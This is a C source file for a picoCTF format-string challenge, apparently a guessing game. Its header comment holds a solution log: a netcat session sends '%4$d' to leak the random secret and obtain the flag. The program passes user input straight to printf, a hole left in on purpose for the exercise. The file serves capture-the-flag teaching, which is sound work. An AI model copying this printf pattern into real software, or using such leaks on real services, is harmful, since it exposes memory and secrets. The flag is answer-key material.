/*
** Solution
* remi@remijullian:~/ctf/format_string/guess$ nc vuln2014.picoctf.com 4546
* Hello! What is your name?
* %4$d
** Welcome to the guessing game, -37693522
** 
** I generated a random 32-bit number.
** You have a 1 in 2^32 chance of guessing it. Good luck.
** What is your guess?
** -37693522
** Wow! You guessed it!
** Your flag is: leak_the_seakret
**
*/

#include <stdio.h>
#include <stdlib.h>

char *flag = "~~FLAG~~";

void main(){
    int secret, guess;
    char name[32];
    long seed;

    FILE *f = fopen("/dev/urandom", "rb");
    fread(&secret, sizeof(int), 1, f);
    fclose(f);

    printf("Hello! What is your name?\n");
    fgets(name, sizeof(name), stdin);

    printf("Welcome to the guessing game, ");
    printf(name);
    printf("\nI generated a random 32-bit number.\nYou have a 1 in 2^32 chance of guessing it. Good luck.\n");

    printf("What is your guess?\n");
    scanf("%d", &guess);

    if(guess == secret){
        printf("Wow! You guessed it!\n");
        printf("Your flag is: %s\n", flag);
    }else{
        printf("Hah! I knew you wouldn't get it.\n");
    }
}
